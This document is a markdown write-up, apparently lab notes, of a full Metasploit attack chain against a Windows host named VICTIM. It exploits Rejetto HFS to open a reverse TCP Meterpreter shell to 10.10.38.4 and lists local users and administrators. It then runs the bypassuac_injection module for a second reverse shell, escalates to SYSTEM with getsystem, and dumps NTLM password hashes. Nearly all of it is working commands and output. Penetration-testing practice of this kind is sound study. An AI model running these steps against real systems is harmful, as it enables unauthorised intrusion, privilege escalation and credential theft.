# UAC Bypass

```bash
# Start Metasploit
# Exploit HTTP File Server with Rejetto
msf6 exploit(windows/http/rejetto_hfs_exec) >
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.38.4:4444 
[*] Using URL: http://10.10.38.4:8080/mxzfyEMw3E2XoQ5
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /mxzfyEMw3E2XoQ5
[*] Sending stage (176198 bytes) to 10.0.19.218
[!] Tried to delete %TEMP%\ELNFQoQgF.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.38.4:4444 -> 10.0.19.218:49297) at 2025-07-24 13:56:17 +0530
[*] Server stopped.

meterpreter > 

# "admin" prrivilege
meterpreter > getuid
Server username: VICTIM\admin

# Start Shell session
meterpreter > shell
Process 3028 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

# List all users
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net users
net users

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.

# List all users in administrator group
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/rejetto_hfs_exec) >
```

Bypass UAC with module
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search bypassuac

msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/bypassuac_injection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_injection) > 

msf6 exploit(windows/local/bypassuac_injection) > set TARGET Windows\ x64
TARGET => Windows x64
msf6 exploit(windows/local/bypassuac_injection) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/local/bypassuac_injection) > run

[*] Started reverse TCP handler on 10.10.38.4:4433 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 2372
[*] Sending stage (201798 bytes) to 10.0.19.218
[+] Deleted C:\Users\admin\AppData\Local\Temp\1\nGsWpYdL.dll
[+] Deleted C:\Windows\System32\NTWDBLIB.dll
[*] Meterpreter session 2 opened (10.10.38.4:4433 -> 10.0.19.218:49338) at 2025-07-24 14:07:24 +0530

meterpreter > 

meterpreter > getuid
Server username: VICTIM\admin
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# Hashdump
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```